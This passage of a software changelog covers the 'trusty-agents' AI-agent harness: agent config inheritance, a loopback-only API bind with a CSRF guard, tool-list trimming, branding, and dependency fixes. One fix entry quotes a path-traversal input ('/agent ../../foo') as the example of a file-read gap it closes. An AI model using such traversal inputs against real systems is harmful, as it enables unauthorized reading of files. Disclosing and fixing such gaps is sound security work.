  `extends`) to `extends = "assistant"`, keeping only its Duetto-specific
  deltas (CTO ops DB tools, ticketing, extra git tools, org/APEX/voice
  skills, and its tuned `[llm]` sampling — see below) — it now also inherits
  the base's black-box posture and full gworkspace surface.

- **Per-key `[llm]` `extends` inheritance for `temperature`/`max_tokens`:**
  `crate::agents::extends::merge_extends` previously inherited the entire
  `[llm]` block wholesale from the base, discarding a child's declared
  `temperature`/`max_tokens` even when explicitly set — a live regression
  for `cto-assistant`'s conversion above (its #469 max_tokens bump, 1024 →
  4096, for untruncated GFA reports/org tables, and its lower temperature,
  0.3, for factual precision, would otherwise have silently reverted to the
  base's conversational defaults). `temperature`/`max_tokens` are now the
  only two `[llm]` fields resolved per-key: a child that declares one
  overrides the base's, one it omits inherits the base's. This is enabled by
  a new UNSET-sentinel serde default (`LlmParams::temperature`/`max_tokens`
  — `NaN` / `u32::MAX`, never a realistic real-world value) plus a new
  `AgentConfig::validate_llm_required_for_root` parse-time guard: a root
  (non-`extends`) agent TOML must still declare real values (restoring the
  fail-fast guarantee the old serde-mandatory-field requirement gave), while
  an `extends` child may now legitimately omit either or both to inherit the
  base's. `.md`-format `extends` children (which have no frontmatter path to
  declare `temperature`/`max_tokens` at all) now correctly inherit the
  base's values too, instead of always resolving to the `parse_md_agent`
  stub defaults (0.2 / 8192) regardless of the base. Every other `[llm]`
  field (`use_anthropic_direct`, `stop_sequences`, `max_turns`, ...) keeps
  the pre-existing inherited-from-base-wholesale behavior — this is a
  narrow, deliberate schema addition scoped to the two fields with no serde
  default, not a general per-key `[llm]` merge. New tests:
  `extends_llm_child_overrides_temperature_only`,
  `extends_llm_child_overrides_max_tokens_only`,
  `extends_llm_child_inherits_when_omitted`
  (`crates/trusty-agents/src/agents/extends/tests.rs`),
  `llm_required_fields_missing_on_root_agent_is_rejected`,
  `llm_omitted_fields_allowed_on_extends_child`, and
  `assistant_tier_llm_sampling_params_pin_per_key_extends_inheritance`
  (`crates/trusty-agents/src/agents/tests/loading.rs`) — the last one pins
  `cto-assistant` resolving to `(0.3, 4096)` and `assistant`/`izzie`
  resolving to their unchanged `(0.7, 1024)`.

### Security

- **Assistant-tier tool black-box strip (PR A, epic #3052):** removed
  `session_list`, `session_status`, `session_send`, `project_list`,
  `console_metrics` (trusty-mpm proxied tools), `system_status` (enumerates
  daemon names including "trusty-mpm"), `mcp_list`/`mcp_enable`/`mcp_disable`
  (enumerate MCP service names), and `agent_delegate` (trusty-mpm's, distinct
  from the native `delegate_to_agent`) from every assistant-tier
  `[tools].allow` list (`assistant`, `izzie` (package + flat shadow),
  `cto-assistant` (package + flat shadow), `personal-assistant`) so a
  conversational assistant persona can no longer name-drop internal
  trusty-* system/daemon architecture to the user. These tools remain
  reachable to `pm`/`ctrl`/`research`/`observe` roles via their own scoping —
  unaffected by this change. A pinning test
  (`assistant_tier_grants_delegation_and_blackboxes_internal_tools`,
  `crates/trusty-agents/src/agents/tests/loading.rs`) asserts the resolved
  `[tools].allow` for `assistant`/`izzie`/`cto-assistant` includes
  `delegate_to_agent` and excludes every black-boxed name.

- **Loopback-only doctrine (#3329):** the HTTP API server (`--api`/`--serve`)
  now binds `127.0.0.1` by default instead of `0.0.0.0`. A non-loopback bind is
  an explicit opt-in via the new `--bind <addr>` flag, and the server **refuses
  to start** on a non-loopback interface unless an API token is set
  (`--api-token` / `TAGENT_API_TOKEN`) — the error points operators at the
  trusty-console proxy (`/api/agents/*`) as the intended remote path. The API
  can spawn arbitrary subprocesses, so an unauthenticated LAN-reachable bind was
  a real exposure. Additionally adopts the shared same-origin write guard
  (`trusty_common::server::with_guarded_middleware`, mirroring #3317) router-wide
  so cross-origin browser writes (CSRF) to `POST /api/task`, the `/api/tm/*`,
  `/api/ctrl/*`, and `POST /rpc` surfaces are rejected with 403; GET reads, the
  `/api/events` SSE stream, and same-origin/loopback writes are unaffected. The
  agents-ui webview keeps working: in Tauri desktop mode writes travel over
  Tauri IPC (never HTTP), and in browser mode the SPA is served same-origin
  loopback. Replaces the crate-local CORS/compression/trace stack with the
  shared standard middleware so trusty-agents no longer drifts from the sibling
  trusty-* daemons.

### Added

- **Product rename: "Trusty Assistant" → "Trusty Agents":** the last
  remaining "Trusty Assistant" product-name references in the desktop UI
  (macOS dock label / `productName` and window `title` in
  `ui/src-tauri/tauri.conf.json`, the page `<title>`/meta description in
  `ui/index.html`, the Tauri capabilities description, the visible
  "desktop app only" copy in `PersonalityPanel.svelte`, `ui/README.md`'s
  heading, the Playwright smoke-test describe block, and descriptive code
  comments) now consistently read "Trusty Agents", matching the header/
  sidebar wordmark and app branding already in place.

- **Canonical Foundry icon set (#3486):** `ActionIcon`, `RobotIcon`, and
  `LogoMark` — previously only defined inline in this crate's
  `ui/src/lib/icons/` — now have a documented canonical source at
  `docs/design/UI/design-system/icons/` (README covers the `ActionIcon`
  name→glyph vocabulary and the `currentColor`/theme-reactivity convention).
  This crate's copies are unchanged behaviorally but now carry a header
  comment pointing back at the canonical source, to be kept in sync until
  #3492 (`@trusty/foundry` package) replaces copy-paste vendoring with a real
  import.

- **Trusty Agents brand identity (#3479):** wires the new Trusty Agents brand
  identity suite (`docs/design/UI/icons/`) into the Assistant UI. Adds
  `Logo.svelte` (full horizontal lockup — mark + "TRUSTY AGENTS" wordmark +
  "UNIT-04 · MPM ORCHESTRATION" descriptor, theme-aware light/Night-Shift-
  reversed via the app's existing `dark:` convention), used in `Header.svelte`
  in place of the old generic robot glyph + literal text block, and
  `Mark.svelte` (standalone UNIT mark for constrained spots), used in
  `LogoMark.svelte`/`Sidebar.svelte`. Regenerates the Tauri app/launcher icon
  set from `trusty-agents-app-icon.png` and installs
  `trusty-agents-favicon.svg` as `public/favicon.svg`. `LogoMark.svelte`'s
  wordmark now reads "Trusty Agents" (was "Trusty Assistant"), matching the
  header lockup. The now-unused generic `RobotIcon.svelte` was removed (its
  two call sites were both replaced). This is an **intentional divergence**
  from the generic Foundry glyph set canonicalized in #3486/#3495 —
  trusty-agents carries its own product identity rather than vendoring the
  placeholder robot glyph verbatim; see
  `docs/design/UI/design-system/icons/README.md`'s "Canonical source,
  vendored copies" section for the documented exemption.

- **CI token drift-check (refs #3486):** a new `scripts/check_token_drift.mjs`
  pins this crate's `app.css` Foundry `--color-*` RGB-triple values to
  `docs/design/UI/design-system/tokens.css` (the canonical hex source),
  wired into CI as the `token-drift` workflow. Fails with a per-token diff if
  the two silently diverge; run locally via `pnpm run check:tokens`. No
  drift was found in this crate — every value already matched canonical.
  Guards against a zero-comparison false-green (an ENFORCED entry with an
  emptied `mappings`/`passthrough` previously reported "matches canonical"
  regardless of the file's real contents — caught by code-critic review) and
  ships `scripts/check_token_drift.test.mjs`, a `node:test` regression suite
  covering drift detection, missing-block/missing-token parse failures, and
  the zero-comparison guard, run in CI ahead of the real check.

### Fixed

- **Credential-test env isolation flake (#3464):** several `llm::credentials`,
  `llm::helpers`, `llm::adapter`, `llm::http`, `ctrl::ctrl_turn::dispatch`, and
  `runtime::cli_def` tests that assert "no credential resolves" or "the store
  wins when env is absent" intermittently failed under `cargo test --workspace`
  (and deterministically on any machine/CI runner with a real project or
  `$HOME` `.env.local`). Root cause: `trusty_common`'s `.env.local` loader is a
  process-global `OnceLock` that fires at most once per test binary; whichever
  test's credential-resolution call happened to be first could have it silently
  re-populate an env var a test had just cleared, mid-call. Fixed by forcing
  that loader to have already run (`test_env::force_env_local_loaded`) before
  any test clears credential env vars, and by clearing every registry-mapped
  provider's env var (not just the three `openrouter`/`anthropic`/`claude-code`
  names) in `other_configured_providers()`'s tests
  (`test_env::clear_all_credential_env_vars`). Also sandboxes `$HOME` in
  `ctrl_creds_errors_when_nothing_configured`, a pre-existing gap that made it
  fail deterministically on any machine with a real secure-store credential.
- **Favicon/RobotIcon drift (#3486):** `ui/public/favicon.svg` was a fourth,
  independently hand-drawn robot face (different rect/circle coordinates, a
  `<text>`-rendered `>_` mouth) that had drifted from `RobotIcon.svelte`'s
  actual markup. Regenerated the favicon's geometry from `RobotIcon.svelte`'s
  `full`-variant paths (same head rect, antenna, eye positions, and stroked
  chevron+underscore mouth) so there is a single robot design instead of two.

### Added

- **Shared-inference seam, Step 1+2 (#2410):** `llm::inference_bridge` is a
  pure, field-by-field conversion between `async-openai`'s wire types
  (`ChatCompletionRequestMessage`, `ChatCompletionTool`,
  `ChatCompletionMessageToolCall`) and `trusty_common::inference`'s shared
  request/response model, and `llm::inference_client::InferenceClient` is an
  OpenRouter transport built on it (mirrors `trusty-code`'s
  `OpenAiCompatClient`). Wired into `tool_loop::turn::dispatch_turn`'s plain
  OpenRouter branch behind `TAGENT_INFERENCE_SHARED=1` — **inert by default**:
  with the flag unset (or any value other than `"1"`), every existing call
  path is byte-for-byte unchanged, including the cache_control/tool_choice-
  forcing raw path, native-Anthropic-direct, ollama, and Bedrock, none of
  which this flag ever touches. Anthropic-direct migration and Fireworks
  routing are explicitly out of scope for this step (later epic steps).
- The API server now writes the standard `http_addr` discovery file on bind
  (and removes it on graceful shutdown), so the trusty-console reverse proxy can
  resolve the agents surface at `/api/agents/*` (#3331).

### Fixed

- Committed `ui/pnpm-lock.yaml` (architecture-review tranche 0): the file was gitignored with a comment claiming the repo-wide detect-secrets pre-commit hook flags npm integrity hashes, but the root `.pre-commit-config.yaml` already excludes `.*pnpm-lock\.yaml` (only the crate-scoped `crates/trusty-agents/.pre-commit-config.yaml`, which governs Python tooling and is unrelated to the JS UI, was missing that exclusion) and no CI workflow runs detect-secrets at all. Every other Tauri UI in the workspace (`trusty-mpm-gui`, `trusty-search`, `trusty-memory`, `trusty-analyze`, `trusty-code-gui`, `trusty-console`) already commits its own subdir-scoped `pnpm-lock.yaml`; `trusty-agents/ui` was the only outlier. Removed the stale `.gitignore` entry and regenerated the lockfile with `pnpm install --lockfile-only`.

### Added

- `PATCH /api/agents/:name` — persists a per-agent `model_id`/`provider_id` override to that agent's `.trusty-agents/agents/<name>.toml`, editing the `[agent]` table in place via `toml_edit` so every other key, comment, and prose block (e.g. a long system-prompt) survives untouched. `provider_id` is validated against the `trusty_common::inference::registry` catalog surfaced by `GET /api/models` (#3243); a `runner = "claude-code"` agent rejects any model/provider that doesn't resolve to Anthropic, since the local `claude` CLI only talks to Anthropic. Returns the updated agent in the same shape `GET /api/agents` uses, so a client can round-trip through either route. Pairs with the agent create/edit UI merged in #3279 (closes [#3246](https://github.com/bobmatnyc/trusty-tools/issues/3246), part of epic #3052)
- new bundled base `assistant` agent (`.trusty-agents/agents/assistant/`) — a reusable, **nameless** personal-productivity template derived from the "Izzie" prototype: functional `role = "assistant"`, the curated Google Workspace tool surface, `memory.read`/`memory.write`/`search.read` scopes plus **read-only** `google.read` (§5.5 — a generic template does not mutate a user's Google data by default), and generic helpful/productivity instructions, with NO persona name, user-identity binding, or user-specific skills. Persona identity is contributed by a user's `extends = "assistant"` personalization overlay (Eve §2.5.1). Izzie is now shipped as the reference overlay example (`.trusty-agents/agents/izzie/`): `extends = "assistant"` + personal deltas (display name, personal skills, Masa-bound persona) and an explicit opt-in to Google **write** (`google.*`). The `extends` inheritance resolver lands in [#3055](https://github.com/bobmatnyc/trusty-tools/issues/3055); until then the overlay carries the curated `[tools]` allowlist/scopes and the safety-critical persona guardrails (approval-framing, anti-hallucination) redundantly so it is safe standalone, and the working Izzie the REPL/Telegram persona paths load remains the standalone `izzie.toml` (closes [#3054](https://github.com/bobmatnyc/trusty-tools/issues/3054), refs #3052, #3055)

- `extends:`-based agent personalization (DOC-41 §2.5 / §2.5.1, epic #3052): a user can now personalize a stock/bundled base agent — name it, add tools, override tone — without forking it, by authoring a child agent (e.g. `~/.trusty-agents/agents/my-assistant.md`) that declares `extends: <base>` and layers personal deltas on top. The previously-inert `extends:` frontmatter key is now live. Resolution mirrors trusty-mpm's proven `compose_agent` exactly (same `MAX_DEPTH = 8`, case-insensitive base lookup, base-first prose concatenation) and runs once at load time — reachable from BOTH the informational `AgentRegistry::load` AND the real dispatch loaders `AgentConfig::by_name`/`by_name_async` (a flat `<name>.md` overlay tier was added to both so a personalization overlay actually dispatches, not just shows in the roster) — never per dispatch. Merge follows the §2.5 table: scalars (`model`, `display_name`, `role`, `description`, plus `runner` and opt-in `persistent_session`) child-overrides-parent; list fields (`tools.allowed`, `tools.scopes`, `system_prompt.skills`, `capabilities`) union (dedup, base-first); persona/instruction prose concatenates base-first; `llm`/`compress`/`session`/`plugins`/`rbac` inherit from the base wholesale. Cycles, missing parents, and over-deep chains fail with a clear `AgentExtendsError`; in the registry a failed resolution keeps the unresolved agent but surfaces the breakage in the roster / `tagent agents list` (new `AgentSummary::extends_error`). A directory package whose `extends` can't be resolved no longer silently shadows a complete flat `<name>.toml` — the loader falls back to the flat file with a warn. Case-only duplicate agent names are rejected at load (they broke case-insensitive resolution). `.md` agent frontmatter now also parses `tools:` and `display_name:` so a personalization overlay's declared tools actually union with the base's (closes [#3055](https://github.com/bobmatnyc/trusty-tools/issues/3055))

### Changed

- The REPL startup splash (`repl::tui::banner::banner_lines`, and its dormant widget-mode counterpart `draw_banner`) now renders the shared trusty splash art (`trusty_common::banner::TRUSTY_SPLASH_ART`, per-glyph shaded via `shade_bucket`) instead of a bespoke robot-glyph design, so `tagent`'s REPL presents the same trusty branding as `tm`'s launch banner (closes [#3326](https://github.com/bobmatnyc/trusty-tools/issues/3326)). The left column is now sized from the shared art's actual width instead of a fixed 18-col floor. tagent's own contextual text (identity line, recent activity, commands) is unchanged.
- `gworkspace` `[[tool_registry.endpoints]]` in the bundled default config now
  ships `enabled = true` (was `false`, "pending auth"). `rpc.discover` on the
  `trusty-gworkspace-mcp` server is a pure static function that never touches
  the token store, so eager discovery at harness startup always succeeds
  regardless of auth state; unauthenticated tool calls fail with a clear
  "run setup" operational error instead of a startup crash. Authenticate with
  `trusty-gworkspace-mcp setup` to actually light up Gmail/Calendar/Drive
  access for the Assistant (Phase 1 of the Assistant epic #3052, part of
  [#3056](https://github.com/bobmatnyc/trusty-tools/issues/3056))

### Fixed

- REPL `/agent <name>` (`handle_agent_command_into`, `crates/trusty-agents/src/repl/agent_commands.rs`) now resolves personas via the same directory-package + `extends`-aware loader the one-shot `--direct` path already used, instead of a hardcoded flat-file check (`agents_dir.join("{name}.toml")`) — so `/agent assistant` now activates the base Assistant persona, which ships only as a directory package (`assistant/agent.toml`, no flat `assistant.toml`). `/agent` with no argument (`list_assistant_agents_into`) now surfaces directory-package agents too, not just flat `*.toml` files, and `/switch assistant` is a recognized alias alongside ctrl/izzie/cto. Resolution is anchored to the REPL's own resolved `agents_dir` via a new `AgentConfig::by_name_in(dirs, name)` (the default-dirs `AgentConfig::by_name` is now a thin wrapper over it) rather than `by_name`'s process-global `TAGENT_CONFIG_DIR`/CWD dirs, so a standalone launch (CWD outside the project) still activates exactly what it just listed. `by_name`/`by_name_in` (and their async twin) also now reject an agent name containing `/`, `\`, or an exact `.`/`..` segment before any `dir.join(name)` join — closing a path-traversal gap where `/agent ../../foo` could read `agent.toml`/`persona.md` outside the intended agents directory (closes [#3303](https://github.com/bobmatnyc/trusty-tools/issues/3303), refs #3052)
- `run_pm_task_with_persona` (the dispatch path a selected named persona/Assistant chat turn takes) now reaches tool parity with the session path (`run_pm_task_with_history`) — delegation (`delegate_to_agent`), CTRL project-management (`add_project`, `list_projects`, `remove_project`, `stop_task`, `set_active_project`), filesystem (`move_file`, `create_dir`), search (`search_code`), shell (`run_bash`), and `tm` tools are now registered alongside the MCP/git/ticketing/live-MCP tools it already wired. Access is still gated per persona: a tool is only advertised to the LLM when its name matches the persona's `[tools].allow` glob list (extracted into the new pure `filter_persona_tool_names` helper, pinned by 4 unit tests) and passes the existing RBAC-tier filter — registering a tool is not the same as granting it, so no persona gains capability beyond what it already declares. Full `[tools].scopes` enforcement remains tracked separately by [#3208](https://github.com/bobmatnyc/trusty-tools/issues/3208) (closes [#3285](https://github.com/bobmatnyc/trusty-tools/issues/3285))
- `llm::credentials::pick_credentials()` now resolves `openrouter`/`anthropic`/`claude-code` via the shared `trusty_common::inference::credentials::resolve_key` 3-tier resolver (env > `.env.local` > secure keyring/file store) instead of a raw `std::env::var` read — a credential configured only via `tagent config keys set` was previously invisible at chat dispatch even though `trusty-channels` and this crate's own `GET /api/models` catalog already consulted the shared store (closes [#3248](https://github.com/bobmatnyc/trusty-tools/issues/3248))
- `tmux::orchestrator::TmuxOrchestrator::create_session` and `debugger::tmux::TmuxAdapter::create_session` now apply generous tmux scrollback (`history-limit=100000`) and mouse-wheel scrolling BEFORE `new-session`, via the new shared `trusty_common::tmux` layer — this crate previously ran its own independent tmux implementation with no scrollback handling at all, so every trusty-agents-hosted tmux session (including the debug REPL) was stuck at tmux's tiny 2000-line default even after trusty-mpm's #2398/#2399 fix landed (closes [#3004](https://github.com/bobmatnyc/trusty-tools/issues/3004), refs #2398, #2399)
- migrate off archived/unsound `serde_yml` (GHSA-hhw4-xg65-fp2x) and its transitive `libyml` (GHSA-gfxp-f68g-8x78) onto the workspace-blessed `serde_yaml` 0.9, closing Dependabot alerts #42/#43 (closes [#2991](https://github.com/bobmatnyc/trusty-tools/issues/2991))
- bump `lru` 0.12 → 0.16, fixing RUSTSEC-2026-0002 (`IterMut` violates Stacked Borrows, GHSA-rhfx-m35p-ff5j); no call-site changes needed ([#2782](https://github.com/bobmatnyc/trusty-tools/pull/2782)) ([`e62b454`](https://github.com/bobmatnyc/trusty-tools/commit/e62b4540d39c5a442d05e849197157932f37e664))
